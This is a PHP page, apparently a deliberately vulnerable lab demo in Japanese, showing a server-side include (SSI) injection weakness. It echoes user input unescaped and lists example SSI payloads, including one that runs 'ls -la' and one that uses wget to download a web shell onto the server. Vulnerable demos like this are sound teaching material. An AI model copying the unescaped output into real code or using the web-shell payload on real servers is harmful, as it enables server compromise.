<?php

// セッションを開始
session_start();

if (isset($_POST['message'])) {
    $message = $_POST['message'];
}

?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>SSIデモ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            white-space: pre-line;
        }
    </style>
</head>
<body>
<p><a href="/">戻る</a></p>
<h1>SSIの脆弱性があるサイト</h1>
<div>
    説明
    <pre>
        このサイトは、SSI(サーバーサイドインクルード)の脆弱性がある為、<br/>悪意のあるユーザーによって、以下のような攻撃が可能です。
        <br/>
        ・サーバー内部でコマンドを実行させる例
        <code>&lt;!--#exec cmd=&quot;ls -la&quot; --&gt;</code>
        <br/>
        ・サーバー内にWeb-Shellをアップロードする例
        <code>&lt;!--#exec cmd=&quot;wget http://web/webshell.txt -O webshell.php&quot; --&gt;</code>
    </pre>
</div>
<form action="index.php" method="POST">
    <label for="message">メッセージを入力してください:</label><br>
    <input type="text" id="message" name="message"><br><br>
    <button type="submit">送信</button>
</form>

<?php
if (isset($message) && '' !== $message) {
    echo "<h2>投稿されたメッセージ</h2>";
    echo "<pre>" . $message . "</pre>";
}
?>
</body>
</html>
